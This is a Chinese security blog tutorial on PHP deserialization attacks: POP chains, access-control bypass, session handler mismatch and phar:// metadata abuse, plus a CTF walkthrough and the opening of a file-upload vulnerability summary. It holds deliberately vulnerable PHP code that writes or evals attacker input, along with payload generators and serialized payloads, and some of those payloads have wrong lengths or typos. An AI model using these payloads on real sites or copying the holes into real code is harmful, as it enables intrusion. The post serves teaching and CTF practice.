<p>在<code>unserialize()</code>中会直接调用<code>wakeup()</code> 或<code>destruct()</code>，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码直接在<code>wakeup()</code>或<code>destruct()</code>中，从而当我们控制序列化字符串时就可以去直接触发它们。</p>
<p>假设index源码如下：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$fp=fopen(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class=$_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> $class;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$class_unser=unserialize($class);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;shell.php&quot;</span>;        <span class="comment">//包含shell.php文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    基本的思路是，通过 <code>serialize()</code> 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “<?php phpinfo();?>“,再调用<code>unserialize()</code>时会通过<code>__wakeup()</code>把test的写入到<code>shell.php</code>中。为此我们写个php脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">	var $test &#x3D; &#39;123&#39;;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$fp&#x3D;fopen(&quot;shell.php&quot;,&quot;w&quot;);</span><br><span class="line">		fwrite($fp,$this-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2&#x3D;new a();</span><br><span class="line">$class2-&gt;test&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;;</span><br><span class="line">$class2_ser&#x3D;serialize($class2);</span><br><span class="line">echo $class2_ser;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<blockquote>
<p>O:1:”a”:1:{s:4:”test”;s:18:”<?php phpinfo();?>”;}</p>
</blockquote>
<p>当我们传入的时候便触发了<code>_wakeup</code>，将一句话木马传入了<code>shell.php</code>中。</p>
<ul>
<li><p><strong>__construct()</strong></p>
<p>有时候反序列化一个对象时，由它调用的<code>__wakeup()</code>中又去调用了其他的对象，由此我们可以一步步倒推，从尾至头找到漏洞点。</p>
<blockquote>
<p>以下示例引用自Cyzcc的博客：<a href="http://cyzcc.vip/2020/04/02/php-unserialize/">http://cyzcc.vip/2020/04/02/php-unserialize/</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CyzCc&#123;</span><br><span class="line">	function __construct($test)&#123;</span><br><span class="line">		$fp &#x3D; fopen(&quot;shell.php&quot;,&quot;w&quot;) ;</span><br><span class="line">		fwrite($fp,$test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Wc&#123;</span><br><span class="line">	var $test &#x3D; &#39;123&#39;;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$obj &#x3D; new CyzCc($this-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class5 &#x3D; $_GET[&#39;test&#39;];</span><br><span class="line">print_r($class5);</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">$class5_unser &#x3D; unserialize($class5);</span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 <code>_wakeup()</code>函数，从而在<code>new CyzCc</code>会自动调用对象<code>CyzCc</code>中的<code>construct()</code>方法，从而将<code>phpinfo()</code>写入到<code>shell.php</code>中。</p>
<blockquote>
<p>O:2:”Wc”:1:{s:4:”test”;s:18:”<?php phpinfo();?>;}</p>
</blockquote>
</li>
</ul>
<h3 id="绕过访问控制"><a href="#绕过访问控制" class="headerlink" title="绕过访问控制"></a>绕过访问控制</h3><p>访问控制的定义：</p>
<blockquote>
<p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p>
<ul>
<li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li>
<li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li>
<li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li>
</ul>
<p>——引自 菜鸟教程 “PHP 面向对象”</p>
</blockquote>
<p>当出现了<strong>protected</strong>或<strong>private</strong>时，我们可能会无法访问该属性或方法，这时就需要绕过这些访问控制了。</p>
<ul>
<li><p><strong>protected</strong></p>
<p>用<code>/00*/00</code>（url中为<code>%00*%00</code>）来绕过。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;类sofun中的proteced file属性绕过</span><br><span class="line">O:5:&quot;sofun&quot;:1:&#123;s:7:&quot;&#x2F;00*&#x2F;00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>private</strong></p>
<p>用<code>%00</code>来绕过。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;类sofun中的private file属性绕过</span><br><span class="line">O:5:&quot;sofun&quot;:1:&#123;s:15:&quot;%00sofun%00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h3 id="同名方法利用"><a href="#同名方法利用" class="headerlink" title="同名方法利用"></a>同名方法利用</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//demo1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $target;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;target = <span class="keyword">new</span> B;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;target-&gt;action();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;action B&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;action A&quot;</span>;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个例子中，class B和class C有一个同名方法action，我们可以构造目标对象，使得析构函数调用class C的action方法，实现任意代码执行。</p>
<p>构造代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">	var $target;</span><br><span class="line">	function __construct() &#123;</span><br><span class="line">		$this-&gt;target &#x3D; new C;</span><br><span class="line">		$this-&gt;target-&gt;test &#x3D; &quot;phpinfo();&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __destruct() &#123;</span><br><span class="line">		$this-&gt;target-&gt;action();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class C &#123;</span><br><span class="line">	var $test;</span><br><span class="line">	function action() &#123;</span><br><span class="line">		echo &quot;action C&quot;;</span><br><span class="line">		eval($this-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo serialize(new A);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;<span class="number">0</span>:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">localhost/demo1.php?test=O:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;0:1:&quot;C&quot;:1&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h1><p>pop链，即把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。</p>
<p>通俗点就是：反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<p>举个简单的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;d&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>分析这个上述代码：</p>
<p>先找魔术方法<code>__destruct()</code>，<code>lemon</code>这个类本来是调用<code>normal</code>类的，但是现在<code>action</code>方法在<code>evil</code>类里面也有，所以可以构造pop链，调用<code>evil</code>类中的<code>action</code>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> lemon()));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\r&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>值得注意的是，<code>protected $ClassObj = new evil();</code>是不行的，还是需要通过<code>__construct</code>来实例化。</p>
<hr>
<h1 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h1><p>PHP中的Session是在经序列化后存储，读取时再进行反序列化的。</p>
<p>相关配置：</p>
<table>
<thead>
<tr>
<th>配置</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>session.save_handler=””</td>
<td>设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数。(数据库等方式)</td>
</tr>
<tr>
<td>session.save_path=””</td>
<td>设置session的存储路径。</td>
</tr>
<tr>
<td>session.auto_start boolen</td>
<td>指定会话模块是否在请求开始时启动一个会话。(默认为0不启动)</td>
</tr>
<tr>
<td>session.serialize_handler string</td>
<td>定义用来序列化/反序列化的处理器名字。(默认使用php)</td>
</tr>
</tbody></table>
<p>PHP中有三种序列化处理器，如下表所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/php1/9.jpg"></p>
<p>然后session序列化后需要储存在服务器上，默认的方式是储存在文件中，储存路径在<code>session.save_path</code>中，如果没有规定储存路径，那么默认会在储存在<code>/tmp</code>中，文件的名称是’sess_’+session名，文件中储存的是序列化后的session。</p>
<p>示例代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/php1/10.jpg"></p>
<p>该内容存储后即为序列化的session：<code>test|s:4:&quot;test&quot;;</code></p>
<p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的Session序列化格式不同，就可能产生反序列化漏洞。</p>
<p>下面演示漏洞利用：</p>
<p>该页面有类<code>demo3</code>，我们开启session，并用php处理器来处理session。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//demo3.php</span></span><br><span class="line">ini_set(<span class="string">&quot;session.serialize_handle&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;wakeup!&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过session.php设置session，通过generate.php构造实例。</p>
<p>由于session.php与demo3.php采用的序列化处理器不同，我们可以构造“误导”处理器，达到漏洞利用的目的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//session.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;test&#x27;</span>] = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> session_id();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//generate.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test  = <span class="string">&quot;w2t3rp2dd13r&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> demo3);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问得到实例的序列化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:5:&quot;demo3&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;w2t3rp2dd13r&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>要在<code>serialize()</code>的结果前加<code>|</code>，当使用php处理器时，就会把<code>|</code>后的内容给反序列化，从而调用<code>demo3.php</code>中的<code>__wakeup()</code>方法和<code>__destruct()</code>方法。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|O:5:&quot;demo3&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;w2t3rp2dd13r&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/php1/11.png"></p>
<p>访问<code>demo3.php</code>成功创建了一个类<code>demo3</code>的实例。</p>
<hr>
<h1 id="phar实现php反序列化"><a href="#phar实现php反序列化" class="headerlink" title="phar实现php反序列化"></a>phar实现php反序列化</h1><p>phar（PHp ARchive）的解释是：like a Java JAR，but for PHP.   所以它本身其实是一个打包文件，是伪协议中的一种，和反序列化好像没有什么联系。</p>
<p>然而在2018年8月，安全研究员 <strong>Sam Thomas</strong> 在   <code>BlackHat2018</code>大会  上分享了议题：<code>It’s a PHP unserialization vulnerability Jim, but not as we know it.</code>     其利用<strong>phar</strong>伪协议会将用户自定义的<strong>meta-data</strong>序列化的形式存储这一特性，扩展了php反序列化的攻击面。</p>
<p>因此，我们是可以利用phar来实现php的反序列化的。用户自定义的meta-data会以序列化形式存储在phar文件中的manifest部分；当使用phar://协议来解析phar文件时，便会对phar文件中的manifest部分进行反序列化。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><h3 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h3><p>phar由四个部分组成。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.stub</span><br><span class="line">	phar 扩展识别的标志 格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;  只有结尾是__HALT_COMPILER();?&gt;才会被php识别为是一个phar。</span><br><span class="line"></span><br><span class="line">2.manifest</span><br><span class="line">	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。</span><br><span class="line"></span><br><span class="line">3.contents</span><br><span class="line">	压缩文件的内容</span><br><span class="line"></span><br><span class="line">4.signature</span><br><span class="line">	文件的签名内容</span><br></pre></td></tr></table></figure>



<h3 id="phar文件生成"><a href="#phar文件生成" class="headerlink" title="phar文件生成"></a>phar文件生成</h3><p>我们来自己构建一个<code>phar</code>文件，<code>php</code>内置了一个<code>Phar</code>类。<br> <strong>注意：需要将<code>php.ini</code>中的<code>phar.readonly</code>设置成off。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#eval.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $val;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$val</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;val = $val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        assert(<span class="keyword">$this</span>-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phar_gen.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Evil.class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$exception = <span class="keyword">new</span> Evil(<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;vul.phar&quot;</span>);		<span class="comment">//定义phar文件的文件名</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();		<span class="comment">// 启动缓冲Phar写操作</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);		<span class="comment">//以字符串的形式添加一个文件到 phar 档案</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);		<span class="comment">//设置存根，即设置a stub的内容</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($exception);			<span class="comment">//设置phar归档元数据</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();			<span class="comment">//停止缓冲对Phar归档文件的写请求，并将更改保存到磁盘</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>然后我们用二进制编辑器打开生成文件，如下图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/3.png"></p>
<p>可以看到其中的一段序列化文本，就是<code>meta-data</code>序列化的结果。</p>
<h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar://反序列化"></a><code>phar://</code>反序列化</h3><p>那么，如何利用<code>phar://</code>进行反序列化呢？</p>
<p>使用<code>phra://</code>伪协议读取文件的时候，文件会被解析成phar对象，这个时候，刚才那部分的序列化的信息就会被反序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Evil.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( file_exists($_REQUEST[<span class="string">&#x27;url&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;success!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;error!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>访问test.php， <code>http://127.0.0.1/test.php?url=phar://vul.phar</code>，得下图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/4.png"></p>
<h2 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h2><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，即<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。采用这种方法可以绕过很大一部分上传检测。</p>
<p>下面这道题目就利用了这个漏洞：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/5.png"></p>
<p>我们写一个php来建一个phar。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$exception = <span class="keyword">new</span> funny();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;flag.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($exception);<span class="comment">//将自定义的meta-data存入mainfest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php文件系统大部分函数再通过phar://解析时，会对meta-data反序列化，从而达到我们的目的。</p>
<p>访问该php得到了flag.php。</p>
<p>进linux对phar进行cat发现是乱码，原来是因为phar是一个data文件。其原因是data会被base64解密一次，只要再data加密就可以cat了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/6.png"></p>
<p>我们再对其进行urlencode，防止加号被吃，然后就可以上传了。</p>
<p>我们得到了txt文件，问了大佬才知道只要是phar://协议解析，后缀是什么都无所谓，我之前甚至都没有想过这个问题。。。</p>
<p>然后我们就拿到flag啦。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/7.png"></p>
<p>我们得到了txt文件，因为这里的后缀<code>.txt</code>是不会影响反序列化操作的，我们就成功拿到flag啦。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/8.png"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>phar的知识现在已经有很多了，也很值得去深挖，自己还只是会了一点表面，需要更加深入的研究。    </p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
  </entry>
  <entry>
    <title>文件上传漏洞总结</title>
    <url>/2021/01/02/php2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要总结文件上传漏洞。文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
<hr>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>文件上传漏洞非常常见，是web安全中经常利用的一种漏洞形式。我们经常可以见到在web应用程序中，许多都会允许上传图片、文本或者其他资源到指定的位置，文件上传漏洞就是通过利用这些可以上传的地方，将恶意代码植入到服务器中，再通过url去访问，从而执行代码来达到恶意攻击的目的。造成文件上传漏洞的原因有很多，比如对上传文件的后缀或扩展名没有做较为严格的限制，对于上传文件的<code>MIMETYPE</code>没有做检查，又或者没有限制对于上传的文件的文件权限，都有可能会导致文件上传漏洞。<a id="more"></a></p>
<hr>
<h1 id="漏洞的检查与利用"><a href="#漏洞的检查与利用" class="headerlink" title="漏洞的检查与利用"></a>漏洞的检查与利用</h1><p>主要分为客户端和服务端上的漏洞。</p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="js检查"><a href="#js检查" class="headerlink" title="js检查"></a>js检查</h3><p>前端一般会用JS函数来验证上传文件的扩展名之类的操作，相比起安全措施，这更像是一种防止用户上传操作失误的措施，我们直接删除掉JS代码，或者使用burp一类的工具进行改包，就可以绕过这类验证。</p>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="检查后缀-扩展名"><a href="#检查后缀-扩展名" class="headerlink" title="检查后缀/扩展名"></a>检查后缀/扩展名</h3><p>对于在服务端进行扩展名检查的，一般分为两种：黑名单和白名单，其中后者相对更安全一点，不容易出现疏漏。</p>
<h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="寻找可解析后缀"><a href="#寻找可解析后缀" class="headerlink" title="寻找可解析后缀"></a>寻找可解析后缀</h5><p>利用burpsuite工具截断HTTP请求，利用intruder模块进行枚举后缀名，来寻找黑名单中是否存在没有过滤到的后缀名。</p>
<p>常见的可解析后缀名有：</p>
